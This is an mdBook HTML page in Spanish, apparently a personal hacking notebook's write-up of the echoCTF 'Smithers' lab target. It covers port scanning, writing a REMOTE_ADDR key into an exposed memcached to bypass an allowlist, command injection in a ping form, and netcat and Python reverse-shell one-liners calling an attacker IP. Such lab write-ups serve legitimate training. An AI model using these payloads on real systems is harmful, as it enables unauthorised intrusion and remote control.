@@ -1,0 +1,297 @@
+<!DOCTYPE HTML>
+<html lang="es" class="sidebar-visible no-js ayu">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>Smithers - Secronomicón</title>
+        <!-- Custom HTML head -->
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <meta name="description" content="Libro de notas donde encontrarás cada truco/técnica/guía de hacking que he aprendido y recolectado de CTFS, aplicaciones reales, lectura de writeups y noticias.">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff" />
+
+        <link rel="icon" href="../../../../favicon.svg">
+        <link rel="shortcut icon" href="../../../../favicon.png">
+        <link rel="stylesheet" href="../../../../css/variables.css">
+        <link rel="stylesheet" href="../../../../css/general.css">
+        <link rel="stylesheet" href="../../../../css/chrome.css">
+        <link rel="stylesheet" href="../../../../css/print.css" media="print">
+        <!-- Fonts -->
+        <link rel="stylesheet" href="../../../../FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="../../../../fonts/fonts.css">
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="../../../../highlight.css">
+        <link rel="stylesheet" href="../../../../tomorrow-night.css">
+        <link rel="stylesheet" href="../../../../ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+    </head>
+    <body>
+        <!-- Provide site root to javascript -->
+        <script type="text/javascript">
+            var path_to_root = "../../../../";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "ayu" : "ayu";
+        </script>
+
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script type="text/javascript">
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script type="text/javascript">
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            var html = document.querySelector('html');
+            html.classList.remove('no-js')
+            html.classList.remove('ayu')
+            html.classList.add(theme);
+            html.classList.add('js');
+        </script>
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script type="text/javascript">
+            var html = document.querySelector('html');
+            var sidebar = 'hidden';
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            }
+            html.classList.remove('sidebar-visible');
+            html.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <div class="sidebar-scrollbox">
+                <ol class="chapter"><li class="chapter-item expanded affix "><a href="../../../../index.html">Secronomicón</a></li><li class="chapter-item expanded affix "><li class="part-title">Guías / Cursos</li><li class="chapter-item expanded "><a href="../../../../guides/oscp_bof/index.html"><strong aria-hidden="true">1.</strong> OSCP Buffer Overflow</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.</strong> Port Swigger Academy</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../../guides/port_swigger_academy/sql_injection.html"><strong aria-hidden="true">2.1.</strong> SQL Injection</a></li></ol></li><li class="chapter-item expanded "><a href="../../../../guides/pwncollege/index.html"><strong aria-hidden="true">3.</strong> PwnCollege</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../../guides/pwncollege/0_module/index.html"><strong aria-hidden="true">3.1.</strong> Módulo 0</a></li></ol></li><li class="chapter-item expanded "><a href="../../../../guides/active_directory/index.html"><strong aria-hidden="true">4.</strong> Active Directory</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../../guides/active_directory/0_general.html"><strong aria-hidden="true">4.1.</strong> Teoría General</a></li><li class="chapter-item expanded "><a href="../../../../guides/active_directory/1_attacking.html"><strong aria-hidden="true">4.2.</strong> Atacando Active Directory</a></li></ol></li><li class="chapter-item expanded "><a href="../../../../guides/ecpptv2_lab/index.html"><strong aria-hidden="true">5.</strong> eCPPTv2 s4viLab</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../../guides/ecpptv2_lab/1_aragog/index.html"><strong aria-hidden="true">5.1.</strong> Aragog</a></li><li class="chapter-item expanded "><a href="../../../../guides/ecpptv2_lab/2_nagini/index.html"><strong aria-hidden="true">5.2.</strong> Nagini</a></li><li class="chapter-item expanded "><a href="../../../../guides/ecpptv2_lab/3_fawkes/index.html"><strong aria-hidden="true">5.3.</strong> Fawkes</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">5.4.</strong> Matrix 1</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">5.5.</strong> Brainpan</div></li></ol></li><li class="chapter-item expanded "><a href="../../../../guides/nightmare/index.html"><strong aria-hidden="true">6.</strong> Nightmare</a></li><li class="chapter-item expanded affix "><li class="part-title">Misc</li><li class="chapter-item expanded "><a href="../../../../templates/index.html"><strong aria-hidden="true">7.</strong> Templates</a></li><li class="chapter-item expanded affix "><li class="part-title">Cheat Sheets</li><li class="chapter-item expanded "><a href="../../../../cheat_sheets/general.html"><strong aria-hidden="true">8.</strong> General</a></li><li class="chapter-item expanded "><a href="../../../../cheat_sheets/active_directory.html"><strong aria-hidden="true">9.</strong> Active Directory</a></li><li class="chapter-item expanded "><a href="../../../../cheat_sheets/network/general.html"><strong aria-hidden="true">10.</strong> Network</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../../cheat_sheets/network/pivoting.html"><strong aria-hidden="true">10.1.</strong> Pivoting</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">11.</strong> Pwning</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../../cheat_sheets/pwning/linux.html"><strong aria-hidden="true">11.1.</strong> Linux pwning</a></li><li class="chapter-item expanded "><a href="../../../../cheat_sheets/pwning/bof-oscp.html"><strong aria-hidden="true">11.2.</strong> OSCP Buffer Overflow</a></li></ol></li><li class="chapter-item expanded "><a href="../../../../cheat_sheets/fuzzing.html"><strong aria-hidden="true">12.</strong> Fuzzing</a></li><li class="chapter-item expanded "><a href="../../../../cheat_sheets/inyecciones.html"><strong aria-hidden="true">13.</strong> Inyecciones</a></li><li class="chapter-item expanded "><a href="../../../../cheat_sheets/transfer.html"><strong aria-hidden="true">14.</strong> Transferencia de archivos</a></li><li class="chapter-item expanded affix "><li class="part-title">CTFs</li><li class="chapter-item expanded "><a href="../../../../ctfs/20220922_ctf-core2022/index.html"><strong aria-hidden="true">15.</strong> 22/09/2022 - IPN Core 2022 CTF</a></li><li class="chapter-item expanded affix "><li class="part-title">Hack The Box</li><li class="chapter-item expanded "><div><strong aria-hidden="true">16.</strong> Battlegrounds</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../../htb/battlegrounds/mayhem/index.html"><strong aria-hidden="true">16.1.</strong> Cyber Mayhem</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">17.</strong> Challenges</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.</strong> Boxes</div></li><li><ol class="section"><li class="chapter-item expanded "><div><strong aria-hidden="true">18.1.</strong> Linux</div></li><li><ol class="section"><li class="chapter-item expanded "><div><strong aria-hidden="true">18.1.1.</strong> Fácil</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.1.2.</strong> Medio</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.1.3.</strong> Difícil</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.1.4.</strong> Locura</div></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.2.</strong> Windows</div></li><li><ol class="section"><li class="chapter-item expanded "><div><strong aria-hidden="true">18.2.1.</strong> Fácil</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../../htb/boxes/windows/1_facil/Active/index.html"><strong aria-hidden="true">18.2.1.1.</strong> Active</a></li><li class="chapter-item expanded "><a href="../../../../htb/boxes/windows/1_facil/Devel/index.html"><strong aria-hidden="true">18.2.1.2.</strong> Devel</a></li><li class="chapter-item expanded "><a href="../../../../htb/boxes/windows/1_facil/Remote/index.html"><strong aria-hidden="true">18.2.1.3.</strong> Remote</a></li><li class="chapter-item expanded "><a href="../../../../htb/boxes/windows/1_facil/Access/index.html"><strong aria-hidden="true">18.2.1.4.</strong> Access</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.2.2.</strong> Medio</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../../htb/boxes/windows/2_medio/Chatterbox/index.html"><strong aria-hidden="true">18.2.2.1.</strong> Chatterbox</a></li><li class="chapter-item expanded "><a href="../../../../htb/boxes/windows/2_medio/Jeeves/index.html"><strong aria-hidden="true">18.2.2.2.</strong> Jeeves</a></li><li class="chapter-item expanded "><a href="../../../../htb/boxes/windows/2_medio/SecNotes/index.html"><strong aria-hidden="true">18.2.2.3.</strong> SecNotes</a></li><li class="chapter-item expanded "><a href="../../../../htb/boxes/windows/2_medio/Silo/index.html"><strong aria-hidden="true">18.2.2.4.</strong> Silo</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.2.3.</strong> Difícil</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../../htb/boxes/windows/3_dificil/Control/index.html"><strong aria-hidden="true">18.2.3.1.</strong> Control</a></li><li class="chapter-item expanded "><a href="../../../../htb/boxes/windows/3_dificil/Search/index.html"><strong aria-hidden="true">18.2.3.2.</strong> Search</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.2.4.</strong> Locura</div></li></ol></li></ol></li><li class="chapter-item expanded "><li class="part-title">echoCTF</li><li class="chapter-item expanded "><div><strong aria-hidden="true">19.</strong> Challenges</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">20.</strong> Networks</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">21.</strong> Targets</div></li><li><ol class="section"><li class="chapter-item expanded "><div><strong aria-hidden="true">21.1.</strong> Principiante</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">21.2.</strong> Básico</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../../echoCTF/targets/2_basic/Flanders/index.html"><strong aria-hidden="true">21.2.1.</strong> Flanders</a></li><li class="chapter-item expanded "><a href="../../../../echoCTF/targets/2_basic/Smithers/index.html" class="active"><strong aria-hidden="true">21.2.2.</strong> Smithers</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">21.3.</strong> Intermedio</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">21.4.</strong> Avanzado</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">21.5.</strong> Experto</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../../echoCTF/targets/5_expert/gogo-yubari/index.html"><strong aria-hidden="true">21.5.1.</strong> Gogo Yubari</a></li><li class="chapter-item expanded "><a href="../../../../echoCTF/targets/5_expert/hajmetr/index.html"><strong aria-hidden="true">21.5.2.</strong> Hajmetr</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">21.6.</strong> Guru</div></li></ol></li></ol>
+            </div>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky bordered">
+                    <div class="left-buttons">
+                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </button>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu (default)</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title">Secronomicón</h1>
+
+                    <div class="right-buttons">
+                        <a href="../../../../print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script type="text/javascript">
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <h1 id="estadísticas"><a class="header" href="#estadísticas">Estadísticas</a></h1>
+<div class="table-wrapper"><table><thead><tr><th>Característica</th><th>Descripción</th></tr></thead><tbody>
+<tr><td>Nombre</td><td><a href="https://echoctf.red/target/5">smithers</a></td></tr>
+<tr><td>Dificultad</td><td>Beginner</td></tr>
+<tr><td>Banderas</td><td>7 (5 other, env, root)</td></tr>
+<tr><td>Puntos</td><td>8,100 pts (other/1,500 pts, other/1,000 pts, other/1,000 pts, other/1,000 pts, other/1,000 pts, env/900 pts, root/1,500 pts)</td></tr>
+<tr><td>Descripción / Pistas</td><td>Like Smithers this server will serve you well only if you manage to enter it's memcached store. The memcache service you just discovered on smithers.echocity-f.com/10.0.160.142:11211 has a hidden flag.</td></tr>
+</tbody></table>
+</div>
+<h1 id="reconocimiento"><a class="header" href="#reconocimiento">Reconocimiento</a></h1>
+<h2 id="escaneo-de-host"><a class="header" href="#escaneo-de-host">Escaneo de host</a></h2>
+<h3 id="escaneo-completo-de-puertos"><a class="header" href="#escaneo-completo-de-puertos">Escaneo completo de puertos</a></h3>
+<pre><code class="language-bash">❯ nmap -T5 -open -vvv --min-rate=5000 -p- -n -Pn -oG nmap/all_ports $BOX_TARGET
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-14 19:45 CDT
+Initiating Connect Scan at 19:45
+Scanning 10.0.100.142 [65535 ports]
+Discovered open port 11211/tcp on 10.0.100.142
+Discovered open port 10888/tcp on 10.0.100.142
+Completed Connect Scan at 19:45, 21.90s elapsed (65535 total ports)
+Nmap scan report for 10.0.100.142
+Host is up, received user-set (0.14s latency).
+Scanned at 2021-10-14 19:45:20 CDT for 22s
+Not shown: 53830 closed ports, 11703 filtered ports
+Reason: 53830 conn-refused and 11703 no-responses
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT      STATE SERVICE  REASON
+10888/tcp open  unknown  syn-ack
+11211/tcp open  memcache syn-ack
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 22.00 seconds
+</code></pre>
+<h3 id="escaneo-específico"><a class="header" href="#escaneo-específico">Escaneo específico</a></h3>
+<pre><code class="language-bash">❯ nmap -sCV -p 11211,10888 -oN nmap/targeted $BOX_TARGET
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-14 19:46 CDT
+Nmap scan report for 10.0.100.142
+Host is up (0.14s latency).
+
+PORT      STATE SERVICE   VERSION
+10888/tcp open  http      nginx
+|_http-title: Network Tools
+11211/tcp open  memcached Memcached 1.5.12 (uptime 36084 seconds)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 15.60 seconds
+</code></pre>
+<h1 id="enumeración"><a class="header" href="#enumeración">Enumeración</a></h1>
+<h2 id="servicios"><a class="header" href="#servicios">Servicios</a></h2>
+<h3 id="http---10888"><a class="header" href="#http---10888">http - 10888</a></h3>
+<h4 id="manual"><a class="header" href="#manual">Manual</a></h4>
+<p>Al navegar al sitio se visualiza algún tipo de servicio que pone a disposición utilidades de red, pero de acuerdo con el mensaje que se arroja se puede suponer que para tener acceso se requiere estar en algún tipo de lista blanca que se encuentra configurada en el servidor. Tratando de hacer un bypass básico a esta validación se decidió jugar un poco con cabeceras como <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For">X-Forwarded-For</a> entre otras, para ver si la respuesta por parte del servidor cambiaba de algún modo, sin éxito aparente.</p>
+<p><img src="./images/enum_1.png" alt="enum_1" /></p>
+<h3 id="memcached---11211"><a class="header" href="#memcached---11211">memcached - 11211</a></h3>
+<h4 id="manual-1"><a class="header" href="#manual-1">Manual</a></h4>
+<p>Siendo permitida la conexión directa mal socket mediante <code>netcat</code> se permite la obtención de datos existentes en el servidor mediante comandos propios de <code>memcached</code>, datos como versión, estatus, slabs, items, entre otros.</p>
+<p><strong>Comandos útiles</strong></p>
+<p><em>Después de entablar la conexión</em></p>
+<pre><code class="language-bash">version # Obtener versión
+stats # Obtener estatus
+stats slabs # Obtener slabs
+stats items # Obtener items de slabs con información
+stats cachedump &lt;numero_de_item&gt; 0 # Obtener nombres de llaves (0 es para no limitar el tamaño del output)
+get &lt;nombre_de_item&gt; # Obtener información guardada de item
+</code></pre>
+<p><em>Referencia: https://book.hacktricks.xyz/pentesting/11211-memcache</em></p>
+<p><img src="./images/enum_2.png" alt="enum_2" /></p>
+<p>Recalcando que para la obtención del <code>número de item</code> se puede extraer de la columna señalada del output generado por la obtención de los items.</p>
+<h1 id="explotación"><a class="header" href="#explotación">Explotación</a></h1>
+<p>Habiendo encontrado que se puede exfiltrar información mediante la interacción con el servicio de <code>memcached</code> faltaría validar si también se puede configurar información en el servicio.</p>
+<h2 id="abuso-de-escritura-de-items-en-memcached"><a class="header" href="#abuso-de-escritura-de-items-en-memcached">Abuso de escritura de items en <code>memcached</code></a></h2>
+<h3 id="pasos-previos--preparación"><a class="header" href="#pasos-previos--preparación">Pasos previos | Preparación</a></h3>
+<p>Dentro de la enumeración se encontró que la versión de <code>memcached</code> y la información contenida al navegar al sitio expuesto coincidía por lo que bajo la suposición de que estos dos interactuan entre sí y de no haber encontrado el item <code>REMOTE_ADDR</code> como lo indica el sitio web se puede intentar guardando este item con el valor de la IP correspondiente.</p>
+<p><strong>Sintaxis</strong></p>
+<pre><code class="language-bash">set key flags exptime bytes
+value 
+</code></pre>
+<p><strong>Uso</strong></p>
+<pre><code class="language-bash">set REMOTE_ADDR 0 2592000 4
+test
+</code></pre>
+<p><em>Referencia: https://www.tutorialspoint.com/memcached/memcached_set_data.htm</em></p>
+<p>Al tener problemas de interacción directa para configurar los valores se encontraron otras alternativas funcionales.</p>
+<h4 id="método-1"><a class="header" href="#método-1">Método 1</a></h4>
+<p><strong>Comando</strong></p>
+<p><code>echo -e 'set REMOTE_ADDR 0 2592000 4\r\ntest\r' | nc -nv -w 1 10.0.100.142 11211</code></p>
+<p><img src="./images/exploit_1.png" alt="exploit_1" /></p>
+<ol>
+<li>Ejecución.</li>
+<li>Validación de existencia (cuando antes no se desplegaba el item 1).</li>
+<li>Obtención de valor de valor.</li>
+</ol>
+<h4 id="método-2"><a class="header" href="#método-2">Método 2</a></h4>
+<p>El paquete <code>libmemcached-tools</code> cuenta con utilidades para interactuar con conexiones de <code>memcached</code>. Haciendo uso de <code>memccp</code> se puede copiar un valor pasando como parámetro el archivo con el valor que se piensa ocupar y haciendo uso de <code>memcat</code> para la visualización de los valores de los items.</p>
+<pre><code class="language-bash">sudo apt install libmemcached-tools
+echo -n &quot;test2&quot; &gt; REMOTE_ADDR
+memccp --servers=10.0.100.142 REMOTE_ADDR
+memccat --servers=10.0.100.142 REMOTE_ADDR
+</code></pre>
+<p><img src="./images/exploit_2.png" alt="exploit_2" /></p>
+<p><em>Referencia: https://www.hackingarticles.in/penetration-testing-on-memcached-server/</em></p>
+<h3 id="ejecución"><a class="header" href="#ejecución">Ejecución</a></h3>
+<p>Configurando la variable que concuerda con ambos servicios y añadiendo la asignada por la vpn el output de la página resulta diferente.</p>
+<p><img src="./images/exploit_3.png" alt="exploit_3" /></p>
+<p>A partir de este punto se puede observar que se habilita un formulario para realizar un ping a un host, lo que a nivel de código se puede reducir en algo como:</p>
+<pre><code class="language-php">$ip = &quot;valor proporcionado por formulario&quot;
+system('ping ' . $ip);
+</code></pre>
+<p>Lo que al final se reduciría en ejecución remota de comandos, ya que en consola podemos usar &quot;separadores&quot; para ejecutar múltiples comandos en una misma instrucción, lo que a nivel de código se ejemplificaría en <code>ping 127.0.0.1; whoami</code>.</p>
+<p><img src="./images/exploit_4.png" alt="exploit_4" /></p>
+<p>Al ver el servicio lo ejecuta directamente <code>root</code>, al obtener una reverse shell, no se requiriría proceso de escalación de privilegios.</p>
+<p>Al realizar la prueba para obtener una reverse shell con netcat usando <code>;nc -e /bin/bash 10.10.0.26 1234</code> no se ejecutó satisfactoriamente por lo que se optó intentar con diferentes alcances, siendo <code>python3</code> el funcional (<code>;python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.0.26&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;sh&quot;)'</code>).</p>
+<p><img src="./images/exploit_5.png" alt="exploit_5" /></p>
+<h1 id="ubicación-de-banderas"><a class="header" href="#ubicación-de-banderas">Ubicación de banderas</a></h1>
+<ol>
+<li>Llave - valor de <code>memcached</code>.</li>
+<li><code>/var/lib/nginx/html/network-tools.php</code> x 3.</li>
+<li><code>/</code></li>
+<li>Extrayendo las variables de entorno de los procesos en ejecución con <code>strings /proc/*/environ | grep ETSCTF</code>.</li>
+<li><code>/root</code>.</li>
+</ol>
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="../../../../echoCTF/targets/2_basic/Flanders/index.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+                            <a rel="next" href="../../../../echoCTF/targets/5_expert/gogo-yubari/index.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="../../../../echoCTF/targets/2_basic/Flanders/index.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+                    <a rel="next" href="../../../../echoCTF/targets/5_expert/gogo-yubari/index.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+            </nav>
+
+        </div>
+
+        <script type="text/javascript">
+            window.playground_copyable = true;
+        </script>
+        <script src="../../../../elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../../../../mark.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../../../../searcher.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../../../../clipboard.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../../../../highlight.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../../../../book.js" type="text/javascript" charset="utf-8"></script>
+
+        <!-- Custom JS scripts -->
+    </body>
+</html>
